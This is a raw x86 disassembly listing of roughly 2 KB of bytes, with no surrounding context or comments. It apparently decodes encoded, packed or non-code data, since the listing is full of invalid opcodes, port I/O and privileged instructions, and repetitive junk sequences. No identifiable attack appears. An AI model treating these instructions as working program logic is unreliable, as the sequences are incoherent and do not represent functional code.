  422e47:	inc    ebx
  422e48:	out    0x35,eax
  422e4a:	push   eax
  422e4b:	(bad)  
  422e4c:	jo     0x422df1
  422e4e:	test   eax,0x8d25fbab
  422e53:	test   eax,0x6d6a439d
  422e58:	les    eax,FWORD PTR [edx-0x7272f95e]
  422e5e:	lea    edi,[edx]
  422e60:	in     al,0x3a
  422e62:	je     0x422e16
  422e64:	mov    ah,0xef
  422e66:	cdq    
  422e67:	adc    bh,0x8b
  422e6a:	arpl   di,dx
  422e6c:	and    eax,0x7780f9d3
  422e71:	test   BYTE PTR [edx+0x5046ef84],dh
  422e77:	ja     0x422dfd
  422e79:	push   eax
  422e7a:	xlat   BYTE PTR ds:[ebx]
  422e7b:	mov    ebp,DWORD PTR [ecx+0x76f08074]
  422e81:	or     eax,esp
  422e83:	push   0xffffffb2
  422e85:	mov    edx,0x8677ecee
  422e8a:	in     al,dx
  422e8b:	mov    dl,0xc4
  422e8d:	outs   dx,DWORD PTR ds:[esi]
  422e8e:	or     eax,esp
  422e90:	push   0xffffffec
  422e92:	ja     0x422f0a
  422e94:	add    bh,0xfd
  422e97:	add    ebp,eax
  422e99:	ja     0x422e28
  422e9b:	inc    ebx
  422e9c:	push   0x1
  422e9e:	lds    esi,FWORD PTR [edi-0x73]
  422ea1:	mov    ds:0x8d8d8d06,al
  422ea6:	cmp    dl,bl
  422ea8:	and    eax,0x5d353180
  422ead:	mov    dl,0xb5
  422eaf:	xor    eax,0x3163ef2d
  422eb4:	xor    eax,0x8f26d3a5
  422eb9:	push   cs
  422eba:	dec    ebp
  422ebb:	jne    0x422ef2
  422ebd:	pop    ebp
  422ebe:	mov    dl,0xb4
  422ec0:	out    dx,eax
  422ec1:	adc    BYTE PTR [ebp+0x11802d35],dl
  422ec7:	or     DWORD PTR [edi+edx*4-0x73],ebx
  422ecb:	mov    dl,0xbe
  422ecd:	dec    DWORD PTR [ecx]
  422ecf:	and    bh,dh
  422ed1:	pop    edi
  422ed2:	xor    DWORD PTR ds:0x801bd32d,esi
  422ed8:	mov    al,ds:0x8def8d60
  422edd:	lea    eax,[ebx-0x2]
  422ee0:	mov    dl,0xbe
  422ee2:	das    
  422ee3:	mov    ecx,0xec8df03a
  422ee8:	push   0x1
  422eea:	lds    esi,FWORD PTR ds:0x7b2746d
  422ef0:	das    
  422ef1:	aas    
  422ef2:	xor    DWORD PTR ds:0xb9a0432d,esi
  422ef8:	aas    
  422ef9:	xchg   edi,eax
  422efa:	(bad)  
  422efb:	in     al,dx
  422efc:	push   0xffffffed
  422efe:	push   0x3a
  422f00:	add    ebp,eax
  422f02:	xor    eax,0x8099746d
  422f07:	sub    al,BYTE PTR [esi+0x4d4d069c]
  422f0d:	sbb    BYTE PTR [eax+eax*4+0x6ffc51],0x86
  422f15:	repnz push es
  422f17:	dec    ebp
  422f18:	dec    ebp
  422f19:	cdq    
  422f1a:	sub    BYTE PTR [edx],0xfc
  422f1d:	jns    0x422f4e
  422f1f:	stos   DWORD PTR es:[edi],eax
  422f20:	xchg   BYTE PTR [ebx-0x66b2b2fa],dh
  422f26:	cld    
  422f27:	jns    0x422f98
  422f29:	mov    ds:0x4d063986,eax
  422f2e:	dec    ebp
  422f2f:	cld    
  422f30:	jns    0x422f3e
  422f32:	cdq    
  422f33:	cmp    BYTE PTR [esi-0x42],0xc4
  422f37:	test   DWORD PTR [ebp+0x4d],ecx
  422f3a:	xchg   edi,eax
  422f3b:	add    BYTE PTR [edi+0x3a4587a2],0x8d
  422f42:	lea    edi,[edi+esi*2-0x75]
  422f46:	mul    BYTE PTR [edi+ebp*2]
  422f49:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  422f4d:	cmc    
  422f4e:	and    al,0x6f
  422f50:	cmp    BYTE PTR [eax+0x7750ef77],al
  422f56:	out    dx,eax
  422f57:	xor    BYTE PTR [edi-0x75],0x80
  422f5b:	xchg   edi,eax
  422f5c:	mov    edx,DWORD PTR [ebx+0xde29b99]
  422f62:	lahf   
  422f63:	push   ebx
  422f64:	mov    dh,0xb2
  422f66:	clc    
  422f67:	sub    DWORD PTR [edx+eiz*1+0x24],esp
  422f6b:	outs   dx,DWORD PTR ds:[esi]
  422f6c:	cmp    BYTE PTR [ebx+0x74],dl
  422f6f:	mov    dl,0x86
  422f71:	or     al,0xff
  422f73:	sti    
  422f74:	push   eax
  422f75:	ja     0x422fed
  422f77:	xor    BYTE PTR [edi-0x75],0x80
  422f7b:	xchg   edi,eax
  422f7c:	mov    edx,DWORD PTR [ebx+0x74]
  422f7f:	mov    dl,0x86
  422f81:	or     al,0x53
  422f83:	mov    dh,0xb2
  422f85:	clc    
  422f86:	sub    edi,edi
  422f88:	sti    
  422f89:	push   eax
  422f8a:	ja     0x422f16
  422f8c:	xor    BYTE PTR [edi-0x75],0x80
  422f90:	xchg   edi,eax
  422f91:	mov    edx,DWORD PTR [ebx+0x74]
  422f94:	mov    dl,0x86
  422f96:	or     al,0x53
  422f98:	mov    dh,0xb2
  422f9a:	clc    
  422f9b:	sub    edi,edi
  422f9d:	sti    
  422f9e:	push   eax
  422f9f:	ja     0x423003
  422fa1:	xor    BYTE PTR [edi-0x75],0x80
  422fa5:	xchg   edi,eax
  422fa6:	mov    edx,DWORD PTR [ebx+0x74]
  422fa9:	mov    dl,0x86
  422fab:	or     al,0x53
  422fad:	mov    dh,0xb2
  422faf:	clc    
  422fb0:	sub    edi,edi
  422fb2:	sti    
  422fb3:	push   eax
  422fb4:	ja     0x422f3c
  422fb6:	jl     0x42302f
  422fb8:	mul    BYTE PTR cs:[esi+ebp*8]
  422fbc:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  422fc0:	mul    BYTE PTR [ebx+0x777c386f]
  422fc6:	es cli 
  422fc8:	and    al,0x6f
  422fca:	cmp    dl,ah
  422fcc:	cmp    eax,0x6277509d
  422fd1:	push   eax
  422fd2:	ja     0x423036
  422fd4:	loop   0x422f93
  422fd6:	popf   
  422fd7:	push   eax
  422fd8:	ja     0x42303c
  422fda:	push   eax
  422fdb:	ja     0x42303f
  422fdd:	jl     0x423056
  422fdf:	bound  ecx,QWORD PTR [edx]
  422fe1:	lea    ecx,[ebp+0x62777c8d]
  422fe7:	jns    0x422f76
  422fe9:	lea    ecx,[ebp-0x7f748880]
  422fef:	xchg   edi,eax
  422ff0:	mov    edx,DWORD PTR [ebx+0x74]
  422ff3:	push   ebx
  422ff4:	mov    dh,0xb2
  422ff6:	xchg   BYTE PTR [edx+esi*4],cl
  422ff9:	clc    
  422ffa:	sub    edi,edi
  422ffc:	sti    
  422ffd:	push   eax
  422ffe:	ja     0x423062
  423000:	xor    BYTE PTR [edi-0x75],0x80
  423004:	xchg   edi,eax
  423005:	mov    edx,DWORD PTR [ebx+0x74]
  423008:	push   ebx
  423009:	mov    dh,0xb2
  42300b:	xchg   BYTE PTR [edx+esi*4],cl
  42300e:	clc    
  42300f:	sub    edi,edi
  423011:	sti    
  423012:	push   eax
  423013:	ja     0x423077
  423015:	jl     0x42308e
  423017:	jp     0x422fbc
  423019:	or     al,0x8d
  42301b:	lea    edi,[edi+esi*2-0x7c]
  42301f:	pop    edi
  423020:	lea    ecx,[ebp-0x50888373]
  423026:	out    0x8d,eax
  423028:	lea    ecx,[ebp+0xdc86801]
  42302e:	dec    ebp
  42302f:	dec    ebp
  423030:	add    DWORD PTR [eax+0x7a],ebx
  423033:	or     eax,0xfe864d4d
  423038:	or     eax,0xf04d4d4d
  42303d:	scas   eax,DWORD PTR es:[edi]
  42303e:	xlat   BYTE PTR ds:[ebx]
  42303f:	pop    es
  423040:	dec    ebp
  423041:	lock test bh,dl
  423044:	add    al,0x4d
  423046:	lock jp 0x423020
  423049:	jb     0x4230c7
  42304b:	ja     0x422fd1
  42304d:	mov    eax,ds:0x808d8d6d
  423052:	ja     0x422fdf
  423054:	xor    al,0x8b
  423057:	push   ebx
  423058:	je     0x42300c
  42305a:	xchg   BYTE PTR [edx+eiz*8],cl
  42305d:	or     eax,0xb25153a9
  423062:	mov    edx,0x50b2ff29
  423067:	ja     0x4230d3
  423069:	xor    BYTE PTR [edi-0x75],0x80
  42306d:	lock mov ebp,ebp
  423070:	mov    bh,0xc8
  423072:	lea    edx,[ebx+0x74]
  423075:	mov    dl,0x86
  423077:	or     al,0x53
  423079:	push   ecx
  42307a:	mov    dl,0xba
  42307c:	sub    edi,edi
  42307e:	mov    dl,0x50
  423080:	ja     0x4230fc
  423082:	mov    ch,0x4a
  423084:	sbb    eax,0x508d8d8d
  423089:	ja     0x423053
  42308b:	sub    BYTE PTR [ebp-0x7f],0x50
  42308f:	ja     0x423018
  423091:	sub    BYTE PTR [ebp+0x21],0x50
  423095:	ja     0x4230c9
  423097:	xor    BYTE PTR [edi-0x11],0x1
  42309b:	lock enter 0x1050,0x62
  4230a0:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  4230a6:	add    eax,esi
  4230a8:	xchg   DWORD PTR [eax+0x10],edx
  4230ab:	push   esi
  4230ac:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  4230b2:	dec    ebp
  4230b3:	xlat   BYTE PTR ds:[ebx]
  4230b4:	out    dx,eax
  4230b5:	add    eax,esi
  4230b7:	xor    dl,BYTE PTR [eax+0x10]
  4230ba:	pop    esi
  4230bb:	cmp    cl,BYTE PTR [ebp+0x3fba868d]
  4230c1:	lea    ecx,[ebp-0x7f740f80]
  4230c7:	xchg   edi,eax
  4230c8:	mov    edx,DWORD PTR [ebx+0x11]
  4230cb:	push   ebx
  4230cc:	jle    0x423080
  4230ce:	mov    esi,0x29f8b20c
  4230d3:	(bad)  
  4230d4:	(bad)  
  4230d5:	arpl   bp,di
  4230d7:	or     DWORD PTR [edi],ecx
  4230d9:	(bad)  
  4230da:	in     al,dx
  4230db:	lea    ecx,[ebp-0x7f108880]
  4230e1:	int    0x36
  4230e3:	cmp    cl,BYTE PTR [ebp-0x7f107f73]
  4230e9:	ja     0x4230da
  4230eb:	or     ch,0x36
  4230ee:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  4230f4:	xchg   edx,eax
  4230f5:	gs xor al,0xef
  4230f9:	adc    BYTE PTR [eax+0x32],0x3a
  4230fd:	lea    ecx,[ebp+0x4d151801]
  423103:	dec    ebp
  423104:	dec    ebp
  423105:	stos   BYTE PTR es:[edi],al
  423106:	adc    BYTE PTR [edi+0x26d180ef],0x3a
  42310d:	lea    ecx,[ebp+0x5aec9080]
  423113:	adc    BYTE PTR [ebp-0x111d7273],cl
  423119:	dec    ebp
  42311a:	bound  eax,QWORD PTR [ecx-0x73]
  42311d:	lea    ecx,[ebp+0x25964daa]
  423123:	push   ebx
  423124:	push   0x7c
  423126:	dec    edi
  423127:	push   ebp
  423128:	dec    ebp
  423129:	dec    ebp
  42312a:	dec    ebp
  42312b:	outs   dx,BYTE PTR ds:[esi]
  42312c:	mov    ds:0x4f7c0a43,eax
  423131:	pop    ebp
  423132:	dec    ebp
  423133:	dec    ebp
  423134:	dec    ebp
  423135:	jg     0x4230e5
  423137:	push   ebp
  423138:	fwait
  423139:	jl     0x42318a
  42313b:	gs dec ebp
  42313d:	dec    ebp
  42313e:	dec    ebp
  42313f:	stos   DWORD PTR es:[edi],eax
  423140:	lock scas al,BYTE PTR es:[edi]
  423142:	aas    
  423143:	cld    
  423144:	dec    edi
  423145:	ins    DWORD PTR es:[edi],dx
  423146:	dec    ebp
  423147:	dec    ebp
  423148:	dec    ebp
  423149:	xchg   BYTE PTR [ecx],al
  42314b:	push   0x4d4d4d92
  423150:	inc    esp
  423151:	mov    ecx,0x6a53f544
  423156:	jl     0x4231a7
  423158:	sub    eax,0x6e4d4d4d
  42315d:	mov    ds:0x4f7c0a43,eax
  423162:	xor    eax,0x7f4d4d4d
  423167:	scas   al,BYTE PTR es:[edi]
  423168:	push   ebp
  423169:	fwait
  42316a:	jl     0x4231bb
  42316c:	cmp    eax,0xab4d4d4d
  423171:	lock scas al,BYTE PTR es:[edi]
  423173:	imul   edi,esp,0x4f
  423176:	inc    ebp
  423177:	dec    ebp
  423178:	dec    ebp
  423179:	dec    ebp
  42317a:	xchg   BYTE PTR [ecx],al
  42317c:	push   0x4d4d4d47
  423181:	inc    esp
  423182:	mov    ecx,0x7780f544
  423187:	out    dx,eax
  423188:	or     ch,0x32
  42318b:	cmp    cl,BYTE PTR [ebp-0x10187f73]
  423191:	in     eax,dx
  423192:	push   0x71
  423194:	push   eax
  423195:	ja     0x4231cd
  423197:	xor    BYTE PTR [edi-0x11],0x80
  42319b:	int    0xfd
  42319d:	cmp    cl,BYTE PTR [ebp-0x32888373]
  4231a3:	xchg   ebp,eax
  4231a4:	mov    ds:0x777caea5,eax
  4231a9:	lldt   WORD PTR [edi+0x7cb9969d]
  4231b0:	ja     0x4231c2
  4231b2:	aas    
  4231b3:	xchg   BYTE PTR [edi+ecx*2-0x3b],bh
  4231b7:	dec    ebp
  4231b8:	dec    ebp
  4231b9:	dec    ebp
  4231ba:	outs   dx,BYTE PTR ds:[esi]
  4231bb:	mov    ds:0x4f7c0a43,eax
  4231c0:	push   edx
  4231c1:	dec    ebp
  4231c2:	dec    ebp
  4231c3:	dec    ebp
  4231c4:	jg     0x423174
  4231c6:	aas    
  4231c7:	xchg   ebp,eax
  4231c8:	jl     0x423219
  4231ca:	aad    0x4d
  4231cc:	dec    ebp
  4231cd:	dec    ebp
  4231ce:	popf   
  4231cf:	or     bh,BYTE PTR [edi+0x59]
  4231d2:	jl     0x423223
  4231d4:	fisttp QWORD PTR [ebp+0x4d]
  4231d7:	dec    ebp
  4231d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231d9:	xchg   edi,eax
  4231da:	lock scas al,BYTE PTR es:[edi]
  4231dc:	jl     0x42322d
  4231de:	in     eax,0x4d
  4231e0:	dec    ebp
  4231e1:	dec    ebp
  4231e2:	xchg   esi,eax
  4231e3:	add    BYTE PTR [edi],bh
  4231e5:	xchg   BYTE PTR [edi+ecx*2-0x63],bh
  4231e9:	dec    ebp
  4231ea:	dec    ebp
  4231eb:	dec    ebp
  4231ec:	outs   dx,BYTE PTR ds:[esi]
  4231ed:	mov    ds:0x4f7c0a43,eax
  4231f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231f3:	dec    ebp
  4231f4:	dec    ebp
  4231f5:	dec    ebp
  4231f6:	jg     0x4231a6
  4231f8:	aas    
  4231f9:	xchg   ebp,eax
  4231fa:	jl     0x42324b
  4231fc:	lods   eax,DWORD PTR ds:[esi]
  4231fd:	dec    ebp
  4231fe:	dec    ebp
  4231ff:	dec    ebp
  423200:	popf   
  423201:	or     bh,BYTE PTR [edi+0x59]
  423204:	jl     0x423255
  423206:	mov    ch,0x4d
  423208:	dec    ebp
  423209:	dec    ebp
  42320a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42320b:	xchg   edi,eax
  42320c:	lock scas al,BYTE PTR es:[edi]
  42320e:	jl     0x42325f
  423210:	mov    ebp,0x964d4d4d
  423215:	add    BYTE PTR [ebx-0x7a],ch
  423218:	xchg   BYTE PTR [edx+0x3d],ah
  42321b:	lea    ecx,[ebp+0x3677800a]
  423221:	dec    ebp
  423222:	jno    0x4231a4
  423224:	ja     0x4231b1
  423226:	xor    al,0x8b
  423229:	push   ebx
  42322a:	je     0x42327f
  42322c:	push   ecx
  42322d:	mov    dl,0xba
  42322f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423235:	xor    al,0x84
  423238:	arpl   WORD PTR [edx+0x3aca0f09],si
  42323e:	lea    ecx,[ebp-0x7f068880]
  423244:	lock stc 
  423246:	push   ebx
  423247:	je     0x42329c
  423249:	push   ecx
  42324a:	mov    dl,0xba
  42324c:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423252:	xor    al,0x84
  423255:	inc    ebx
  423256:	std    
  423257:	xor    BYTE PTR [edi+0x6a],0x63
  42325b:	mov    dl,0x9
  42325d:	into   
  42325e:	xchg   esp,eax
  42325f:	cmp    cl,BYTE PTR [ebp+0x3e777c8d]
  423265:	lea    ecx,[ebp+0x77808d8d]
  42326b:	out    dx,eax
  42326c:	and    BYTE PTR [edx+0x32],0x3a
  423270:	lea    ecx,[ebp-0x7f101880]
  423276:	ja     0x423267
  423278:	or     ch,0x76
  42327b:	cmp    cl,BYTE PTR [ebp+0x3dda868d]
  423281:	lea    ecx,[ebp+0x71994d0a]
  423287:	xor    al,0xef
  42328a:	adc    BYTE PTR [eax+0x46],0x3a
  42328e:	lea    ecx,[ebp+0x77803a50]
  423294:	out    dx,eax
  423295:	sbb    BYTE PTR [esi+0x32],0x3a
  423299:	lea    ecx,[ebp+0x53efd780]
  42329f:	push   0x1
  4232a1:	sbb    BYTE PTR [ebp-0x79b2b2b3],bl
  4232a7:	fwait
  4232a8:	cmp    eax,0x800a8d8d
  4232ad:	ja     0x42329e
  4232af:	or     ch,0x46
  4232b2:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4232b8:	fwait
  4232b9:	out    dx,eax
  4232ba:	push   eax
  4232bb:	ja     0x4232d3
  4232bd:	xor    BYTE PTR [edi-0x11],0x80
  4232c1:	pop    esi
  4232c2:	xor    bh,BYTE PTR [edx]
  4232c4:	lea    ecx,[ebp+0x53efd780]
  4232ca:	push   0x1
  4232cc:	sbb    ch,al
  4232ce:	dec    ebp
  4232cf:	dec    ebp
  4232d0:	dec    ebp
  4232d1:	xchg   BYTE PTR [ebp+0x3d],al
  4232d4:	lea    ecx,[ebp-0x10887ff6]
  4232da:	or     ch,0x46
  4232dd:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4232e3:	fwait
  4232e4:	out    dx,eax
  4232e5:	xor    BYTE PTR [edi-0x11],0x80
  4232e9:	pop    esi
  4232ea:	xor    bh,BYTE PTR [edx]
  4232ec:	lea    ecx,[ebp+0x53efd780]
  4232f2:	push   0x1
  4232f4:	sbb    BYTE PTR [ebp+0x4d],dl
  4232f7:	dec    ebp
  4232f8:	dec    ebp
  4232f9:	xchg   dh,ch
  4232fb:	cmp    eax,0x800a8d8d
  423300:	ja     0x4232f1
  423302:	or     ch,0x46
  423305:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  42330b:	fwait
  42330c:	out    dx,eax
  42330d:	in     eax,dx
  42330e:	mov    bh,0x5e
  423310:	lea    edx,[eax+0x77]
  423313:	xor    BYTE PTR ss:[edi+0x5e],0xe2
  423318:	pop    ds
  423319:	push   ebx
  42331a:	jb     0x4232bb
  42331c:	dec    ebx
  42331d:	add    eax,0x992fbcd
  423322:	loopne 0x42331f
  423324:	or     cl,BYTE PTR [ebp-0x69]
  423327:	ss dec edi
  423329:	push   0xffffffd7
  42332b:	arpl   WORD PTR [eax-0x7b12a189],ax
  423331:	mov    ebp,gs
  423333:	push   0x6e
  423335:	or     cl,BYTE PTR [ebp-0x69]
  423338:	push   ss
  423339:	dec    edi
  42333a:	push   0xffffffd5
  42333c:	rol    BYTE PTR [eax+0x5e80ef77],cl
  423342:	xor    bh,BYTE PTR [edx]
  423344:	lea    ecx,[ebp+0x53efd780]
  42334a:	push   0x1
  42334c:	xchg   edi,eax
  42334d:	int    0x86
  42334f:	and    bh,BYTE PTR [ebx]
  423351:	lea    ecx,[ebp-0x10887ff6]
  423357:	or     ch,0x3e
  42335a:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  423360:	fwait
  423361:	out    dx,eax
  423362:	push   eax
  423363:	ja     0x423314
  423365:	(bad)  
  423366:	out    dx,al
  423367:	in     eax,dx
  423368:	mov    bh,0xaf
  42336a:	lea    ecx,[ebp+0x77]
  42336d:	pop    esi
  42336e:	in     eax,dx
  42336f:	out    0x5e,eax
  423371:	sub    eax,0x77802ee4
  423376:	stc    
  423377:	xor    al,0xf9
  42337a:	adc    bh,0xef
  42337d:	loop   0x42338c
  42337f:	stos   DWORD PTR es:[edi],eax
  423380:	push   ebx
  423381:	je     0x4233d6
  423383:	sub    dh,BYTE PTR [edx-0x454df37a]
  423389:	sub    edi,edi
  42338b:	mov    dl,0x1
  42338d:	sbb    al,cl
  42338f:	or     eax,0xc3864d4d
  423394:	cmp    ecx,DWORD PTR [ebp+0x77800a8d]
  42339a:	mov    eax,DWORD PTR [eax-0x287f7410]
  4233a0:	out    dx,eax
  4233a1:	push   ebx
  4233a2:	je     0x4233f7
  4233a4:	sub    dh,BYTE PTR [edx-0x454df37a]
  4233aa:	sub    edi,edi
  4233ac:	mov    dl,0x1
  4233ae:	sbb    BYTE PTR [edx+0xd],bh
  4233b1:	dec    ebp
  4233b2:	dec    ebp
  4233b3:	xchg   dl,bl
  4233b5:	cmp    ecx,DWORD PTR [ebp-0x68b2f573]
  4233bb:	scas   eax,DWORD PTR es:[edi]
  4233bc:	xor    al,0x8b
  4233bf:	adc    BYTE PTR [edi+0x5311538b],0x9c
  4233c6:	mov    dl,0xbe
  4233c8:	or     al,0xb2
  4233ca:	clc    
  4233cb:	sub    edi,edi
  4233cd:	(bad)  
  4233ce:	arpl   bp,di
  4233d0:	xlat   BYTE PTR ds:[ebx]
  4233d1:	mov    WORD PTR [edi+esi*2+0x3e],?
  4233d5:	cmp    cl,BYTE PTR [ebp+0x77808d8d]
  4233db:	stc    
  4233dc:	xor    al,0xf9
  4233df:	push   ebx
  4233e0:	je     0x423394
  4233e2:	xchg   BYTE PTR [ebx+edx*2],cl
  4233e5:	sub    dh,BYTE PTR [edx-0x4d00d646]
  4233eb:	in     al,dx
  4233ec:	ja     0x423458
  4233ee:	push   eax
  4233ef:	ja     0x42345b
  4233f1:	xor    BYTE PTR [edi+0x3e],0x4f
  4233f5:	push   0xffffffd5
  4233f7:	sbb    eax,0x80f97780
  4233fc:	lock stc 
  4233fe:	push   ebx
  4233ff:	je     0x423454
  423401:	sub    dh,BYTE PTR [edx-0x454df37a]
  423407:	sub    edi,edi
  423409:	mov    dl,0xec
  42340b:	ja     0x423487
  42340d:	push   eax
  42340e:	ja     0x42348a
  423410:	xor    BYTE PTR [edi-0x7],0x80
  423414:	lock stc 
  423416:	push   ebx
  423417:	je     0x42346c
  423419:	sub    dh,BYTE PTR [edx-0x794dd646]
  42341f:	or     al,0xff
  423421:	mov    dl,0x80
  423423:	lock test BYTE PTR [ebx-0x3],al
  423427:	xor    BYTE PTR [edi+0x6a],0x63
  42342b:	mov    dl,0x9
  42342d:	dec    esp
  42342e:	or     DWORD PTR ds:0xde24d4d,0x7a7780a9
  423438:	xor    al,0x6a
  42343b:	arpl   bp,di
  42343d:	xlat   BYTE PTR ds:[ebx]
  42343e:	push   cs
  42343f:	dec    ebp
  423440:	xlat   BYTE PTR ds:[ebx]
  423441:	out    dx,eax
  423442:	add    DWORD PTR [edi-0x76],esi
  423445:	or     al,BYTE PTR [esi-0x7272809a]
  42344b:	push   eax
  42344c:	ja     0x4234c4
  42344e:	les    ebx,FWORD PTR [ebx]
  423450:	xor    BYTE PTR [edi+0x76],0x80
  423454:	lock stc 
  423456:	adc    BYTE PTR [edi+0x531153f9],0x7e
  42345d:	mov    dl,0xbe
  42345f:	or     al,0xb2
  423461:	clc    
  423462:	sub    edi,edi
  423464:	(bad)  
  423465:	outs   dx,BYTE PTR ds:[esi]
  423466:	out    dx,eax
  423467:	xor    BYTE PTR [edi-0x75],0x80
  42346b:	lock mov edx,DWORD PTR [ebx+0x74]
  42346f:	push   ebx
  423470:	push   ecx
  423471:	mov    dl,0xba
  423473:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423479:	xor    al,0x76
  42347c:	arpl   WORD PTR [edx-0x33f0f7],si
  423482:	lea    ecx,[ebp-0x7f748880]
  423488:	lock mov edx,DWORD PTR [ebx+0x74]
  42348c:	push   ebx
  42348d:	push   ecx
  42348e:	mov    dl,0xba
  423490:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423496:	xor    al,0x8a
  423499:	arpl   WORD PTR [edx-0x7bf0f7],si
  42349f:	lea    ecx,[ebp-0x7f748880]
  4234a5:	lock mov edx,DWORD PTR [ebx+0x74]
  4234a9:	push   ebx
  4234aa:	push   ecx
  4234ab:	mov    dl,0x86
  4234ad:	or     al,0xb2
  4234af:	mov    edx,0xc4b2ff29
  4234b4:	adc    eax,0x80f9f080
  4234b9:	xchg   edi,eax
  4234ba:	stc    
  4234bb:	push   ebx
  4234bc:	adc    DWORD PTR [ebx+0x7e],edx
  4234bf:	mov    dl,0xbe
  4234c1:	or     al,0xb2
  4234c3:	clc    
  4234c4:	sub    edi,edi
  4234c6:	(bad)  
  4234c7:	in     al,dx
  4234c8:	mov    dl,0x80
  4234ca:	lock mov ah,BYTE PTR [ebx-0x4e]
  4234ce:	in     al,0xb8
  4234d0:	xor    BYTE PTR [edi-0x76],0x50
  4234d4:	ja     0x42345a
  4234d6:	xor    BYTE PTR [edi+0x76],0x50
  4234da:	ja     0x42353e
  4234dc:	ins    BYTE PTR es:[edi],dx
  4234dd:	mul    BYTE PTR [edi+ebp*2]
  4234e0:	cmp    BYTE PTR [eax-0x19],dl
  4234e3:	inc    esi
  4234e4:	jl     0x42355d
  4234e6:	xor    ch,0x24
  4234e9:	outs   dx,DWORD PTR ds:[esi]
  4234ea:	cmp    BYTE PTR [eax-0xf7fb989],al
  4234f0:	inc    esi
  4234f1:	push   ebx
  4234f2:	je     0x423547
  4234f4:	push   ecx
  4234f5:	mov    dl,0x86
  4234f7:	or     al,0xb2
  4234f9:	mov    edx,0x50b2ff29
  4234fe:	ja     0x423556
  423500:	xor    BYTE PTR [edi+0x46],0x80
  423504:	lock inc esi
  423506:	push   ebx
  423507:	je     0x42355c
  423509:	push   ecx
  42350a:	mov    dl,0x86
  42350c:	or     al,0xb2
  42350e:	mov    edx,0x50b2ff29
  423513:	ja     0x42358f
  423515:	jl     0x42358e
  423517:	ds dec ecx
  423519:	and    al,0x6f
  42351b:	cmp    BYTE PTR [edi+esi*2+0x1e],bh
  42351f:	fisub  WORD PTR [edi+ebp*2]
  423522:	cmp    BYTE PTR [eax-0xf7fb989],al
  423528:	inc    esi
  423529:	push   ebx
  42352a:	je     0x42357f
  42352c:	push   ecx
  42352d:	mov    dl,0xba
  42352f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423535:	xor    al,0x84
  423538:	arpl   bp,di
  42353a:	or     DWORD PTR [edi],ecx
  42353c:	pop    ss
  42353d:	in     al,dx
  42353e:	lea    ecx,[ebp-0x72f35f42]
  423544:	lea    eax,[eax+0x77803ef0]
  42354a:	adc    BYTE PTR ds:[edi+0x53fc5356],0x11
  423552:	mov    dl,0x84
  423554:	sub    DWORD PTR [edx-0x200f342],esi
  42355a:	xor    BYTE PTR [edi-0x7c],0x43
  42355e:	sti    
  42355f:	push   ebx
  423560:	jb     0x4235ad
  423562:	add    eax,0x807a7750
  423567:	ja     0x423587
  423569:	xor    al,0x1e
  42356c:	push   ebx
  42356d:	je     0x4235c2
  42356f:	push   ecx
  423570:	mov    dl,0xba
  423572:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423578:	xor    al,0x7a
  42357b:	arpl   bp,di
  42357d:	fst    DWORD PTR [edi]
  42357f:	xor    BYTE PTR [edi+0x1e],0x80
  423583:	lock push ds
  423585:	push   ebx
  423586:	je     0x4235db
  423588:	push   ecx
  423589:	mov    dl,0x86
  42358b:	or     al,0xb2
  42358d:	mov    edx,0x50b2ff29
  423592:	ja     0x42360e
  423594:	xor    BYTE PTR [edi+0x3e],0x80
  423598:	lock ds push ebx
  42359b:	je     0x4235f0
  42359d:	push   ecx
  42359e:	mov    dl,0x86
  4235a0:	or     al,0xb2
  4235a2:	mov    edx,0x80b2ff29
  4235a7:	lock jp 0x4235b3
  4235aa:	and    dh,BYTE PTR [edx-0x7f8588b0]
  4235b0:	ja     0x4235f8
  4235b2:	xor    al,0x46
  4235b5:	push   ebx
  4235b6:	je     0x42360b
  4235b8:	push   ecx
  4235b9:	mov    dl,0xba
  4235bb:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4235c1:	xor    al,0x7a
  4235c4:	arpl   bp,di
  4235c6:	or     DWORD PTR [edi],ecx
  4235c8:	(bad)  
  4235c9:	or     al,0x8d
  4235cb:	lea    eax,[eax+0x77507a77]
  4235d1:	scas   eax,DWORD PTR es:[edi]
  4235d2:	xor    BYTE PTR [edi+0x56],0xec
  4235d6:	ja     0x42363a
  4235d8:	push   eax
  4235d9:	out    0x7a,eax
  4235db:	push   eax
  4235dc:	ja     0x423648
  4235de:	pop    esi
  4235df:	cmc    
  4235e0:	and    al,0x6f
  4235e2:	cmp    BYTE PTR [eax+0x77],dl
  4235e5:	pop    esi
  4235e6:	jl     0x42365f
  4235e8:	push   ss
  4235e9:	hlt    
  4235ea:	and    al,0x6f
  4235ec:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  4235f0:	repz and al,0x6f
  4235f3:	cmp    BYTE PTR [eax+0x77],dl
  4235f6:	test   DWORD PTR [eax-0xf7f8589],0x5374537a
  423600:	push   ecx
  423601:	mov    dl,0x86
  423603:	or     al,0xb2
  423605:	mov    edx,0x50b2ff29
  42360a:	ja     0x423609
  42360c:	sub    BYTE PTR [edx-0x42],0x4f
  423610:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423616:	dec    edi
  423617:	or     cl,BYTE PTR [ebp+0x4d]
  42361a:	dec    ebp
  42361b:	jmp    0x7c6a:0x80386f24
  423622:	dec    edi
  423623:	xchg   ebp,eax
  423624:	dec    ebp
  423625:	dec    ebp
  423626:	dec    ebp
  423627:	or     esp,DWORD PTR [edi+ebp*2]
  42362a:	cmp    BYTE PTR [eax-0x7f957f96],al
  423630:	ja     0x423629
  423632:	xor    al,0xf7
  423635:	push   ebx
  423636:	je     0x42368b
  423638:	push   ecx
  423639:	mov    dl,0x86
